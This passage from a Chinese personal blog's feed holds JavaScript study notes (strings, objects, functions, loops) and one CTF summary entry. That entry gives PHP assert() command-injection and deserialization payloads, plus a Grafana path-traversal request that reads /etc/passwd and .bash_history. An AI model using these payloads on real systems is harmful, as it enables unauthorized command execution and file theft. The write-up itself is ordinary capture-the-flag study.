100，调用舍入函数，然后再将其除回<br>2.toFixed(n) 将数字四舍五入到小数点后 n 位，并以字符串形式返回结果</p><p>不精确的计算:<br>数字是以 64 位格式 IEEE-754 表示的:其中 52 位被用于存储这些数字， 11 位用于存储小数点的位置，而 1 位用于符号。<br>1.如果一个数字真的很大，则可能会溢出 64 位存储，变成一个特殊的数值 Infinity<br>2.一个数字以其二进制的形式存储在内存中。但是在十进制数字系统中看起来很简单的 0.1，0.2 这样的小数，实际上在二进制形式中是无限循环小数<br>最可靠的解决方法是借助方法 toFixed(n) 对结果进行舍入</p><p>isFinite 和 isNaN:<br>属于 number 类型，但不是“普通”数字<br>Infinity（和 -Infinity）是一个特殊的数值，比任何数值都大（小）。<br>NaN 代表一个 error。<br>isNaN(value) 将其参数转换为数字，然后测试它是否为 NaN<br>isFinite(value) 将其参数转换为数字，如果是常规数字而不是 NaN/Infinity/-Infinity，则返回 true<br>注:在所有数字函数中，包括 isFinite，空字符串或仅有空格的字符串均被视为 0<br>比较两个值是否完全相同时，它使用Object.is(a,b) === true</p><p>parseInt(str, radix) 和 parseFloat:<br>从字符串中“读取”数字，直到无法读取为止。parseInt 返回一个整数，parseFloat 返回一个浮点数,没有数字可读时为NaN<br>parseInt(str, radix) 的第二个参数为要解析的str的进制,可选</p><p>其他数学函数:<br>Math.random()返回一个从 0 到 1 的随机数（不包括 1）<br>Math.max(a, b, c…)返回最大值<br>Math.pow(n, power)返回 n 的power次幂</p><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>文本数据被以字符串形式存储，单个字符没有单独的类型。<br>字符串的内部格式始终是 UTF-16，它不依赖于页面编码。<br>引号（Quotes）:<br>1.反引号允许我们通过 ${…} 将任何表达式嵌入到字符串中<br>2.允许字符串跨行</p><p>特殊字符:</p><pre><code>\n         换行\r         Windows 文本文件中，两个字符 \r\n 的组合代表一个换行。而在非 Windows 操作系统上，它就是 \n。\&#39;和\&quot;     引号\          转义字符\\         反斜线\t         制表符\b         退格\f         换页\v         垂直\xXX       十六进制 Unicode XX 的 Unicode 字符\u&#123;X…XXXXXX&#125;（1 到 6 个十六进制字符）     具有给定 UTF-32 编码的 Unicode 符号</code></pre><p>字符串长度:</p><pre><code>let str = `Hello`;// 第一个字符alert( str[0] ); // Halert( str.charAt(0) ); // H// 最后一个字符alert( str[str.length - 1] ); // o如果没有找到字符，[] 返回 undefined，而 charAt 返回一个空字符串</code></pre><p>字符串是不可变的:<br>要更改就要创建一个新的字符串，并将其分配给新字符串而不是以前的字符串</p><p>改变大小写:</p><pre><code>toLowerCase() 和 toUpperCase() 改变单个字符大小写alert( &#39;Interface&#39;[0].toLowerCase() ); // &#39;i&#39;</code></pre><p>查找子字符串:<br>str.indexOf(substr, pos)<br>从给定位置 pos 开始，在 str 中查找 substr，如果没有找到，则返回 -1，否则返回匹配成功的位置<br>如果我们对所有存在位置都感兴趣，可以在一个循环中使用 indexOf<br>str.lastIndexOf(substr, position)<br>从字符串的末尾开始搜索到开头,以相反的顺序列出这些事件</p><p>按位（bitwise）NOT :<br>将数字转换为 32-bit 整数（如果存在小数部分，则删除小数部分），然后对其二进制表示形式中的所有位均取反<br>对于 32-bit 整数，~n 等于 -(n+1)</p><p>includes，startsWith，endsWith:<br>includes检测匹配，但不需要它的位置,第二个可选参数是开始搜索的起始位置</p><pre><code>alert( &quot;Widget&quot;.startsWith(&quot;Wid&quot;) );        // true，&quot;Widget&quot; 以 &quot;Wid&quot; 开始alert( &quot;Widget&quot;.endsWith(&quot;get&quot;) );          // true，&quot;Widget&quot; 以 &quot;get&quot; 结束</code></pre><p>获取子字符串:</p><pre><code>str.slice(start,end)返回字符串从 start 到（但不包括）end 的部分start/end 也有可能是负值。它们的意思是起始位置从字符串结尾计算str.substring(start,end)返回字符串从 start 到（但不包括）end 的部分。这与 slice 几乎相同，但它允许 start 大于 endstr.substr(start,length)返回字符串从 start 开始的给定 length 的部分。与以前的方法相比，这个允许我们指定 length 而不是结束位置第一个参数可能是负数，从结尾算起</code></pre><p>比较字符串:<br>1.小写字母总是大于大写字母<br>2.带变音符号的字母存在“乱序”的情况(例如部分国家名字)<br>str.codePointAt(pos)返回在 pos 位置的字符代码<br>String.fromCodePoint(code)通过数字 code 创建字符<br>可以用 \u 后跟十六进制代码，通过这些代码添加 Unicode 字符</p><p><a href="https://zh.javascript.info/string#nei-bu-unicode">内部，Unicode</a></p><p>其他几种有用的字符串方法：<br>str.trim()删除字符串前后的空格 (“trims”)。<br>str.repeat(n)重复字符串 n 次。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="我打江南走过"><a href="#我打江南走过" class="headerlink" title="我打江南走过"></a>我打江南走过</h5><h5 id="那等在季节里的容颜如莲花的开落"><a href="#那等在季节里的容颜如莲花的开落" class="headerlink" title="那等在季节里的容颜如莲花的开落"></a>那等在季节里的容颜如莲花的开落</h5><h5 id="东风不来，三月的柳絮不飞"><a href="#东风不来，三月的柳絮不飞" class="headerlink" title="东风不来，三月的柳絮不飞"></a>东风不来，三月的柳絮不飞</h5><h5 id="你底心如小小寂寞的城"><a href="#你底心如小小寂寞的城" class="headerlink" title="你底心如小小寂寞的城"></a>你底心如小小寂寞的城</h5><h5 id="恰若青石的街道向晚"><a href="#恰若青石的街道向晚" class="headerlink" title="恰若青石的街道向晚"></a>恰若青石的街道向晚</h5><h5 id="跫音不响，三月的春帷不揭"><a href="#跫音不响，三月的春帷不揭" class="headerlink" title="跫音不响，三月的春帷不揭"></a>跫音不响，三月的春帷不揭</h5><h5 id="你底心是小小的窗扉紧掩"><a href="#你底心是小小的窗扉紧掩" class="headerlink" title="你底心是小小的窗扉紧掩"></a>你底心是小小的窗扉紧掩</h5><h5 id="我达达的马蹄是美丽的错误"><a href="#我达达的马蹄是美丽的错误" class="headerlink" title="我达达的马蹄是美丽的错误"></a>我达达的马蹄是美丽的错误</h5><h5 id="我不是归人，是个过客"><a href="#我不是归人，是个过客" class="headerlink" title="我不是归人，是个过客"></a>我不是归人，是个过客</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信安CTF总结</title>
      <link href="/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h5 id="404页面"><a href="#404页面" class="headerlink" title="404页面:"></a>404页面:</h5><p>url+404/</p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h5><pre><code>&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if($_GET[&#39;c&#39;] === &quot;flag&quot;)&#123;            如果 c=flag 的话，会看到 flag.php 文件        highlight_file(&quot;flag.php&quot;);    &#125;    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;       正则匹配过滤 flag 字符        $page = $_GET[&#39;c&#39;];    &#125;    assert(&quot;file_exists(&#39;$page&#39;)&quot;);           assert 函数&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;利用assert函数的特性，实现命令执行assert函数里面的参数为字符串时，会将字符串当做php命令来执行。assert(&#39;phpinfo()&#39;)=&lt;?php phpinfo()?&gt;构造闭合函数，使 assert 函数执行系统命令为还过滤了 flag 字符，使用?匹配符绕过Payload：?c=1&#39;) or system(&#39;ls?c=1&#39;) or system(&#39;cat fla?.txt</code></pre><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>construct()：构造函数/方法，是类中的一种特殊函数,当使用 new 关键字实例化一个对象时,构造函数将会自动调用<br>wakeup( )函数是在 php 在使用反序列化函数 unserialize()时，会自动调用的函数，只要序列化的中的成员数大于实际成员数，即可绕过<br>destruct()函数是在对象被销毁时才会被调用，可以注意到flag.php文件，需password=666绕过第一个if，username等于usernames才能够输出flag文件；<br>参数需要进行 base64 加密<br>Payload：<br>&lt;?php<br>class Name{<br> private $username = ‘usernames’;<br> private $password = ‘666’;<br>}<br>$select = serialize(new Name());<br>$select = str_replace(‘:2:’,’:3:’,$select);<br>echo base64_encode($select);</p><h5 id="grafana漏洞"><a href="#grafana漏洞" class="headerlink" title="grafana漏洞"></a>grafana漏洞</h5><p>抓包根据漏洞的原理，构造 payload 路径，进行任意文件读取<br>/public/plugins/alertlist/../../../../../../../../../etc/pa<br>sswd<br>看到系统的配置文件，存在哪些用户<br>linux 的历史记录文件.bash_history<br>构造 payload:<br>/public/plugins/alertlist/../../../../../../../../../home/grafana/.bash_history</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript拓展（1）</title>
      <link href="/2022/11/05/20221105/"/>
      <url>/2022/11/05/20221105/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="注-本章节较难，请选择性阅读"><a href="#注-本章节较难，请选择性阅读" class="headerlink" title="注:本章节较难，请选择性阅读"></a>注:本章节较难，请选择性阅读</h5><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>使用{…}来创建对象。一个属性就是一个键值对（“key: value”），其中键是一个字符串（也叫做属性名），值可以是任何值。</p><pre><code>构造对象方法:let user = new Object();     // “构造函数” 的语法let user = &#123;&#125;;               // “字面量” 的语法读取文件的属性:alert( user.name );          // Johnalert( user.age );           // 30移除属性:delete user.age;             // 移除age这个key方括号:let user = &#123;&#125;;// 设置user[&quot;likes birds&quot;] = true;  // 单引号或双引号都可以// 读取alert(user[&quot;likes birds&quot;]);  // true// 删除delete user[&quot;likes birds&quot;];属性值简写:name, 与 name: name 相同属性名称限制:类型会被自动地转换为字符串但__proto__属性。不能将它设置为一个非对象的值属性存在性测试:alert( user.noSuchProperty === undefined );       // true 意思是没有这个属性alert( &quot;age&quot; in user );                           // true 存在</code></pre><h4 id="for-in-循环"><a href="#for-in-循环" class="headerlink" title="for..in 循环"></a>for..in 循环</h4><pre><code>for (key in object) &#123;  // 对此对象属性中的每个键执行的代码&#125;遍历一个对象时，整数属性会被进行从小到大排序但是 “+49” 和 “1.2” 不行，那它们就按照创建时的顺序来排序</code></pre><h4 id="对象引用和复制"><a href="#对象引用和复制" class="headerlink" title="对象引用和复制"></a>对象引用和复制</h4><p>赋值了对象的变量存储的不是对象本身，而是该对象“在内存中的地址”。</p><h5 id="对象的引用"><a href="#对象的引用" class="headerlink" title="对象的引用:"></a>对象的引用:</h5><pre><code>let user = &#123; name: &#39;John&#39; &#125;;let admin = user;admin.name = &#39;Pete&#39;;               // 通过 &quot;admin&quot; 引用来修改alert(user.name);                  // &#39;Pete&#39;，修改能通过 &quot;user&quot; 引用看到</code></pre><p>仅当两个对象为同一对象时，两者才相等。<br>两个独立的对象则并不相等，即使它们看起来很像（都为空）。</p><h5 id="对象的复制"><a href="#对象的复制" class="headerlink" title="对象的复制"></a>对象的复制</h5><p>通过遍历已有对象的属性，并在原始类型值的层面复制它们，以实现对已有对象结构的复制。</p><pre><code>let user = &#123;  name: &quot;John&quot;,&#125;;let clone = &#123;&#125;;                       // 新的空对象for (let key in user) &#123;               // 将 user 中所有的属性拷贝到其中  clone[key] = user[key];             // 现在 clone 是带有相同内容的完全独立的对象&#125;clone.name = &quot;Pete&quot;;                  // 改变了其中的数据alert( user.name );                   // 原来的对象中的 name 属性依然是 John【也可以使用 Object.assign 方法】Object.assign(dest, [src1, src2, src3...])1.dest 是指目标对象2.src1, ..., srcN是源对象（需传递的参数）3.将所有源对象的属性拷贝到目标对象 dest 中4.调用结果返回 dest5.如果被拷贝的属性的属性名已经存在，那么它会被覆盖</code></pre><h5 id="深层克隆"><a href="#深层克隆" class="headerlink" title="深层克隆"></a>深层克隆</h5><pre><code>let 克隆生成的对象 = Object.assign(&#123;&#125;, 克隆的对象);或者使用“深拷贝”函数，例如 _.cloneDeep(obj)</code></pre><h4 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h4><p>1.可达性<br>&emsp;&emsp;如果一个值可以通过引用链从根访问任何其他值，则认为该值是可达的<br>&emsp;&emsp;垃圾回收器会删除掉那些已经不可达的(没有外部对其的引用)<br>2.内部算法(mark-and-sweep):<br>&emsp;&emsp;垃圾收集器遍历所有的根，并“标记”（记住）它们和他们的引用。<br>&emsp;&emsp;没有被标记的对象都会被删除。<br>3.优化建议:<br>&emsp;&emsp;分代收集/增量收集/闲时收集<br>&emsp;&emsp;<a href="https://zh.javascript.info/garbage-collection#zong-jie">进阶了解</a></p><h4 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h4><p>存储在对象属性中的函数被称为“方法”<br>使用函数表达式创建一个函数，并将其指定给对象的属性，随后调用它。就叫做得到了 user 对象的 sayHi 方法。</p><h5 id="this"><a href="#this" class="headerlink" title="this"></a>this</h5><p>访问对象中存储的信息<br>this可以用于任何函数,它取决于代码上下文<br>严格模式下没有对象的情况下调用:this==undefined但尝试访问this.name将会报错<br>this的值是在调用时计算出来的，它的值取决于在“点符号前”的是什么对象。<br>箭头函数没有自己的this。若在箭头函数中引用this，则this值取决于外部“正常的”函数。</p><pre><code>let user = &#123; name: &quot;John&quot; &#125;;let admin = &#123; name: &quot;Admin&quot; &#125;;function sayHi() &#123;  alert( this.name );&#125;// 在两个对象中使用相同的函数user.f = sayHi;admin.f = sayHi;// 这两个调用有不同的 this 值// 函数内部的 &quot;this&quot; 是“点符号前面”的那个对象user.f(); // John（this == user）admin.f(); // Admin（this == admin）admin[&#39;f&#39;](); // Admin（使用点符号或方括号语法来访问这个方法，都没有关系。）</code></pre><h4 id="重点误区，必须记住"><a href="#重点误区，必须记住" class="headerlink" title="重点误区，必须记住"></a><a href="https://zh.javascript.info/object-methods#zai-dui-xiang-zi-mian-liang-zhong-shi-yong-this">重点误区，必须记住</a></h4><h4 id="构造器和操作符-“new”"><a href="#构造器和操作符-“new”" class="headerlink" title="构造器和操作符 “new”"></a>构造器和操作符 “new”</h4><h5 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h5><p>命名以大写字母开头。<br>只能由 “new” 操作符来执行</p><pre><code>function User(name) &#123;                1.一个新的空对象被创建并分配给 this。  this.name = name;                  2.函数体执行。通常它会修改 this，为其添加新的属性。  this.isAdmin = false;              3.返回 this 的值。&#125;</code></pre><p>任何函数（除了箭头函数，它没有自己的 this）都可以用作构造器</p><h4 id="new-function-…"><a href="#new-function-…" class="headerlink" title="new function() { … }"></a>new function() { … }</h4><p>如果有许多行用于创建单个复杂对象的代码，可以将它们封装在一个立即调用的构造函数中</p><pre><code>// 创建一个函数并立即使用 new 调用它let user = new function() &#123;  this.name = &quot;John&quot;;  this.isAdmin = false;  // ……用于用户创建的其他代码  // 也许是复杂的逻辑和语句  // 局部变量等&#125;;</code></pre><p>这个构造函数不能被再次调用，因为它不保存在任何地方，只是被创建和调用。<br>因此，这个技巧旨在封装构建单个对象的代码，而无需将来重用。</p><h4 id="构造器模式测试-无需重视"><a href="#构造器模式测试-无需重视" class="headerlink" title="构造器模式测试,无需重视"></a><a href="https://zh.javascript.info/constructor-new#gou-zao-qi-mo-shi-ce-shi-newtarget">构造器模式测试,无需重视</a></h4><h4 id="可选链"><a href="#可选链" class="headerlink" title="可选链"></a>可选链</h4><pre><code>语法有三种形式：obj?.prop —— 如果 obj 存在则返回 obj.prop，否则返回 undefined。obj?.[prop] —— 如果 obj 存在则返回 obj[prop]，否则返回 undefined。obj.method?.() —— 如果 obj.method 存在则调用 obj.method()，否则返回 undefined。总结?. 检查左边部分是否为 null/undefined，如果不是则继续运算。</code></pre><h4 id="symbol-类型"><a href="#symbol-类型" class="headerlink" title="symbol 类型"></a>symbol 类型</h4><p>“symbol” 值表示唯一的标识符。<br>使用 Symbol() 来创建这种类型的值<br>可以给 symbol 一个描述（也称为 symbol 名）          //let id = Symbol(“id”);<br>symbol 保证是唯一的。即使我们创建了许多具有相同描述的 symbol，它们的值也是不同。symbol 不会被自动转换为字符串<br>真的想显示一个 symbol，我们需要</p><pre><code>在它上面调用 .toString()    let id = Symbol(&quot;id&quot;);    alert(id.toString());        //Symbol(id)或者获取 symbol.description 属性，只显示描述    let id = Symbol(&quot;id&quot;);    alert(id.description);       // id</code></pre><p>主要的使用场景：<br>1.“隐藏” 对象属性。<br>    如果我们想要向“属于”另一个脚本或者库的对象添加一个属性，我们可以创建一个 symbol 并使用它作为属性的键。<br>2.JavaScript 使用了许多系统 symbol，这些 symbol 可以作为 Symbol.* 访问。我们可以使用它们来改变一些内建行为。<br>3.symbol 在 for…in 中会被跳过<br>4.Object.keys(user) 也会忽略它们<br>5.相反，Object.assign 会同时复制字符串和 symbol 属性</p><h4 id="对象-——-原始值转换"><a href="#对象-——-原始值转换" class="headerlink" title="对象 —— 原始值转换"></a>对象 —— 原始值转换</h4><p>JavaScript 不允许自定义运算符对对象的处理方式<br>此类运算的情况下，对象会被自动转换为原始值，然后对这些原始值进行运算，并得到运算结果（也是一个原始值）</p><h5 id="转换规则"><a href="#转换规则" class="headerlink" title="转换规则"></a>转换规则</h5><p>1.没有转换为布尔值,所有的对象在布尔上下文（context）中均为 true<br>2.数字转换发生在对象相减或应用数学函数时<br>3.字符串转换通常发生在像 alert(obj) 这样输出一个对象和类似的上下文中</p><h5 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h5><p>“string”（对于 alert 和其他需要字符串的操作）<br>“number”（对于数学运算）<br>“default”（少数运算符，通常对象以和 “number” 相同的方式实现 “default” 转换）</p><h4 id="Symbol-toPrimitive"><a href="#Symbol-toPrimitive" class="headerlink" title="Symbol.toPrimitive"></a>Symbol.toPrimitive</h4><p>用来给转换方法命名</p><h4 id="toString-valueOf"><a href="#toString-valueOf" class="headerlink" title="toString/valueOf"></a>toString/valueOf</h4><p>对于 “string” hint：调用 toString 方法，如果它不存在，则调用 valueOf 方法（因此，对于字符串转换，优先调用 toString）。<br>对于其他 hint：调用 valueOf 方法，如果它不存在，则调用 toString 方法（因此，对于数学运算，优先调用 valueOf 方法）。</p><h4 id="转换可以返回任何原始类型"><a href="#转换可以返回任何原始类型" class="headerlink" title="转换可以返回任何原始类型"></a>转换可以返回任何原始类型</h4><p>它们不一定会返回 “hint” 的原始值<br>唯一强制性的事情是：这些方法必须返回一个原始值，而不是对象。</p><h4 id="进一步的转换"><a href="#进一步的转换" class="headerlink" title="进一步的转换"></a>进一步的转换</h4><p>如果我们将对象作为参数传递，则会出现两个运算阶段：<br>1.对象被转换为原始值（通过前面我们描述的规则）。<br>2.如果还需要进一步计算，则生成的原始值会被进一步转换。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><pre><code>首先调用 obj[Symbol.toPrimitive](hint) 如果这个方法存在，否则，如果 hint 是 &quot;string&quot;        尝试调用 obj.toString() 或 obj.valueOf()，无论哪个存在。否则，如果 hint 是 &quot;number&quot; 或者 &quot;default&quot;        尝试调用 obj.valueOf() 或 obj.toString()，无论哪个存在。在实际使用中，通常只实现 obj.toString() 作为字符串转换的“全能”方法就足够了，该方法应该返回对象的“人类可读”表示，用于日志记录或调试。</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="遇事不决可问春风，春风不语即随本心。"><a href="#遇事不决可问春风，春风不语即随本心。" class="headerlink" title="遇事不决可问春风，春风不语即随本心。"></a>遇事不决可问春风，春风不语即随本心。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（4）</title>
      <link href="/2022/11/04/20221104/"/>
      <url>/2022/11/04/20221104/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h4><pre><code>let sayHi = function() &#123;  alert( &quot;Hello&quot; );&#125;;function关键字后面没有函数名。函数表达式允许省略函数名注意末尾会有个分号!因为这是以 function(…) &#123;…&#125; 的形式创建的。它不是函数语法的一部分。含义:&quot;创建一个函数并将其放入变量sayHi中&quot;。alert( sayHi );         // 显示函数代码————因为函数是一个值alert( sayHi() );       // 执行函数let func = sayHi;       //将 sayHi 复制到了变量 func</code></pre><h5 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h5><pre><code>function ask(question, yes, no) &#123;  if (confirm(question)) yes()  else no();&#125;function showOk() &#123;  alert( &quot;You agreed.&quot; );&#125;function showCancel() &#123;  alert( &quot;You canceled the execution.&quot; );&#125;// 用法：函数 showOk 和 showCancel 被作为参数传入到 askask(&quot;Do you agree?&quot;, showOk, showCancel);</code></pre><p>showOk 是回答 “yes” 的回调，showCancel 是回答 “no” 的回调。</p><h5 id="函数表达式-vs-函数声明"><a href="#函数表达式-vs-函数声明" class="headerlink" title="函数表达式 vs 函数声明"></a>函数表达式 vs 函数声明</h5><p>1.语法<br>函数声明：在主代码流中声明为单独的语句的函数<br>函数表达式：在一个表达式中或另一个语法结构中创建的函数。下面这个函数是在赋值表达式 = 右侧创建的<br>2.创建函数时机<br>在函数声明被定义之前，它就可以被调用。<br>函数表达式是在代码执行到达时被创建，并且仅从那一刻起可用。<br>3.块级作用域<br>严格模式下，当一个函数声明在一个代码块内时，它在该代码块内的任何位置都是可见的。但在代码块外不可见。</p><pre><code>let age = 16;              // 拿 16 作为例子if (age &lt; 18) &#123;  welcome();               // \   (运行)  function welcome() &#123;     //  |    alert(&quot;Hello!&quot;);       //  |  函数声明在声明它的代码块内任意位置都可用  &#125;                        //  |  在花括号外部调用函数，我们看不到它们内部的函数声明  welcome();               // /   (运行)&#125; else &#123;  function welcome() &#123;    alert(&quot;Greetings!&quot;);  &#125;&#125;welcome();                 // Error: welcome is not defined【正确写法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome;if (age &lt; 18) &#123;  welcome = function() &#123;    alert(&quot;Hello!&quot;);  &#125;;&#125; else &#123;  welcome = function() &#123;    alert(&quot;Greetings!&quot;);  &#125;;&#125;welcome(); // 现在可以了【改进方法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome = (age &lt; 18) ?  function() &#123; alert(&quot;Hello!&quot;); &#125; :  function() &#123; alert(&quot;Greetings!&quot;); &#125;;welcome(); // 现在可以了</code></pre><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><pre><code>单行箭头函数:let sum = (a, b) =&gt; a + b;/* 这个箭头函数是下面这个函数的更短的版本：let sum = function(a, b) &#123;  return a + b;&#125;;*/alert( sum(1, 2) ); // 3多行箭头函数:let sum = (a, b) =&gt; &#123;  // 花括号表示开始一个多行函数  let result = a + b;  return result;       // 如果我们使用了花括号，那么我们需要一个显式的 “return”&#125;;alert( sum(1, 2) );    // 3从 =&gt; 的左侧获取参数，计算并返回右侧表达式的计算结果用花括号括起来之后，需要包含 return 才能返回值（就像常规函数一样）只有一个参数，还可以省略掉参数外的圆括号没有参数，括号则是空的（但括号必须保留）</code></pre><h4 id="函数总结"><a href="#函数总结" class="headerlink" title="函数总结"></a>函数总结</h4><p>1.函数是值。它们可以在代码的任何地方被分配，复制或声明。<br>2.如果函数在主代码流中被声明为单独的语句，则称为“函数声明”。<br>3.如果该函数是作为表达式的一部分创建的，则称其“函数表达式”。<br>4.在执行代码块之前，内部算法会先处理函数声明(所以函数声明在其被声明的代码块内的任何位置都是可见的)<br>5.函数表达式在执行流程到达时创建。<br>6.首选使用函数声明;仅当函数声明不适合对应的任务时，才应使用函数表达式。</p><h3 id="javascript基础复习"><a href="#javascript基础复习" class="headerlink" title="javascript基础复习"></a>javascript基础复习</h3><p>1.语句用分号分隔<br>2.即使我们在某处添加了「额外的」分号，这也不是错误。分号会被忽略的。<br>3.尽量使用”use strict”<br>4.使用let，const（不变的，不能被改变），var（旧式的，稍后会看到）声明变量<br>5.变量是动态类型的，它们可以存储任何值<br>6.有 8 种数据类型：<br>&nbsp;&nbsp;number — 可以是浮点数，也可以是整数，<br>&nbsp;&nbsp;bigint — 用于任意长度的整数，<br>&nbsp;&nbsp;string — 字符串类型，<br>&nbsp;&nbsp;boolean — 逻辑值：true/false，<br>&nbsp;&nbsp;null — 具有单个值 null 的类型，表示“空”或“不存在”，<br>&nbsp;&nbsp;undefined — 具有单个值 undefined 的类型，表示“未分配（未定义）”，<br>&nbsp;&nbsp;object 和 symbol — 对于复杂的数据结构和唯一标识符，我们目前还没学习这个类型。<br>7.交互:alert、prompt 和 confirm<br>8.二进制加号 + 可以连接字符串。如果任何一个操作数是一个字符串，那么另一个操作数也将被转换为字符串<br>9.三元运算符:cond?resultA:resultB。如果cond为真,则返回resultA,否则返回resultB<br>10.空值合并运算符:a??b的结果是a,除非a为null/undefined,这时结果是b。<br>11.在 for(let…) 循环内部声明的变量只在该循环内可见。但可以省略let并重用已有的变量。<br>12.break/continue允许退出整个循环/当前迭代。使用标签来打破嵌套循环<br>13.switch”结构可以替代多个if检查。它内部使用===进行比较。<br>14.prompt的结果是一个字符串，而不是数字<br>15.函数声明和循环语句后不需要加分号</p><h5 id="其它说明"><a href="#其它说明" class="headerlink" title="其它说明"></a>其它说明</h5><p><a href="https://zh.javascript.info/debugging-chrome">在浏览器中调试</a><br><a href="https://zh.javascript.info/coding-style#tasks">代码风格!!!</a><br><a href="https://zh.javascript.info/comments">注释</a></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>从岐山到长安，高铁只需要一个小时就能抵达，这么一段路，丞相却走了一生。<br>从生至死，人需要经历百年，但有一段岁月，却跟着我走完了一生。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（3）</title>
      <link href="/2022/11/03/20221103/"/>
      <url>/2022/11/03/20221103/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><pre><code>let i = 0;while (i &lt; 3) &#123;           #条件的结果会被转化为布尔值  alert( i );  i++;&#125;</code></pre><p>如果循环体只有一条语句(单循环体)，则可以省略大括号</p><h5 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h5><pre><code>let i = 0;do &#123;  alert( i );  i++;&#125; while (i &lt; 3);</code></pre><p>将条件检查移至循环体下面<br>先执行循环体，然后检查条件，当条件为真时，重复执行循环体</p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><pre><code>for (begin; condition; step) &#123;  循环体&#125;begin进入循环时执行一次condition判断条件body条件为真时，重复运行step每次循环体迭代后执行</code></pre><p>内联变量声明:<br>&emsp;&emsp;函数在执行时，会先在自己的函数体里查询变量，如果没有，才会一级一级往上查找。函数show()在执行时，输出第一个变量a是undefined是因为它现在自己的执行环境里查询到变量a已声明，即变量提升（即变量可以提前声明但是赋值是不可以的），此时就输出了undefined。<br>&emsp;&emsp;因此会出现变量污染现象<br>省略语句段:<br>&emsp;&emsp;不需要做任何事的部分，就可以省略 begin 语句段<br>&emsp;&emsp;注意for的两个;必须存在</p><h5 id="break与continue"><a href="#break与continue" class="headerlink" title="break与continue"></a>break与continue</h5><p>一，普通<br>用法与python一样<br>但是，禁止break/continue在‘?’的右边<br>所以，不建议使用?代替if语句<br>二，进阶</p><pre><code>标签(在循环之前带有冒号的标识符)break &lt;labelName&gt; 语句跳出循环至标签labelName:处continue &lt;labelName&gt; 语句执行跳转到标记循环的下一次迭代可以将标签移至单独一行break 指令必须在代码块内continue 只有在循环内部才可行</code></pre><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><pre><code>至少一个 case 代码块和一个可选的 default 代码块switch(x) &#123;  case &#39;value1&#39;:  // if (x === &#39;value1&#39;)    ...    [break]  case &#39;value2&#39;:  // if (x === &#39;value2&#39;)    ...    [break]  default:    ...    [break]&#125;流程:判断条件从成立的开始往下执行直到break，若无break则走到尾(包括default)分组:case 3: // (*) 下面这两个 case 被分在一组，满足一个条件就执行，原理是没有breakcase 5:  alert(&#39;Wrong!&#39;);  alert(&quot;Why don&#39;t you take a math class?&quot;);  break;</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>在 JavaScript 中，函数不是“神奇的语言结构”，而是一种特殊的值<br>创建函数的三种方法:函数声明，函数表达式，箭头函数</p><pre><code>function name(parameter1, parameter2, ... parameterN) &#123;  ...body...&#125;name();首先是关键字，然后是函数名，然后是括号之间的参数列表(用逗号分隔)，最后是花括号之间的代码(函数体)parameter是函数参数，下面引用函数时可以使用它作为参数(argument)未提供parameter时，那么相应的值就会变成undefined(默认参数)可以text = 